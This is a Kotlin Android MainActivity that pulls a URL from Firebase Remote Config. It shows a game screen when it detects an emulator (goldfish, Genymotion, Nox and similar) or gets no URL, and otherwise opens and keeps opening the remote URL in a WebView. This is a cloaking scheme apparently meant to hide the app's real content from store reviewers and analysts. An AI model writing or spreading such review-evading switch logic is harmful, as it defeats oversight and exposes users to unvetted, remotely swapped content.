package vla.dracula

import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import vla.dracula.databinding.ActivityMainBinding
import java.util.*

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding
    private lateinit var preferences: SharedPreferences
    private lateinit var url: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        preferences = getSharedPreferences("APP_PREFERENCES", MODE_PRIVATE)
        val flag = preferences.contains("url")

        if (checkForInternet(this)) {
            val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
            val configSettings = remoteConfigSettings {
                minimumFetchIntervalInSeconds = 0
            }
            remoteConfig.setConfigSettingsAsync(configSettings)
            remoteConfig.fetchAndActivate().addOnCompleteListener(this) { task ->
                if (!flag) {
                    if (task.isSuccessful) {
                        Log.d("Firebase", "Success")
                        url = Firebase.remoteConfig.getString("url")
                        if (url.isEmpty() || checkIsEmu()) {
                            val intent = Intent(this, GameActivity::class.java)
                            startActivity(intent)
                        } else {
                            val editor = preferences.edit()
                            editor.putString("url", url)
                            editor.apply()
                            showWebView(url)
                        }
                    } else {
                        Log.d("Firebase", "Failed")
                        val intent = Intent(this, GameActivity::class.java)
                        startActivity(intent)
                    }
                } else {
                    url = preferences.getString("url", "").toString()
                    showWebView(url)
                }
            }
        } else {
            val intent = Intent(this, NoInternetActivity::class.java)
            startActivity(intent)
        }
    }

    private fun showWebView(url: String) {
        val intent = WebViewActivity.newIntentAddItem(this, url)
        startActivity(intent)
    }

    private fun checkIsEmu(): Boolean {
        if (BuildConfig.DEBUG) return false

        val phoneModel = Build.MODEL
        val buildProduct = Build.PRODUCT
        val buildHardware = Build.HARDWARE

        var result = (Build.FINGERPRINT.startsWith("generic")
                || phoneModel.contains("google_sdk")
                || phoneModel.lowercase(Locale.getDefault()).contains("droid4x")
                || phoneModel.contains("Emulator")
                || phoneModel.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || buildHardware == "goldfish"
                || buildHardware == "vbox86"
                || buildProduct == "sdk"
                || buildProduct == "google_sdk"
                || buildProduct == "sdk_x86"
                || buildProduct == "vbox86p"
                || Build.BOARD.lowercase(Locale.getDefault()).contains("nox")
                || Build.BOOTLOADER.lowercase(Locale.getDefault()).contains("nox")
                || buildHardware.lowercase(Locale.getDefault()).contains("nox")
                || buildProduct.lowercase(Locale.getDefault()).contains("nox"))

        if (result) return true
        result = result or (Build.BRAND.startsWith("generic")
                && Build.DEVICE.startsWith("generic"))
        if (result) return true
        result = result or ("google_sdk" == buildProduct)
        return result
    }

    private fun checkForInternet(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            val network = connectivityManager.activeNetwork ?: return false

            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false

            return when {
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true
                else -> false
            }
        } else {
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }
}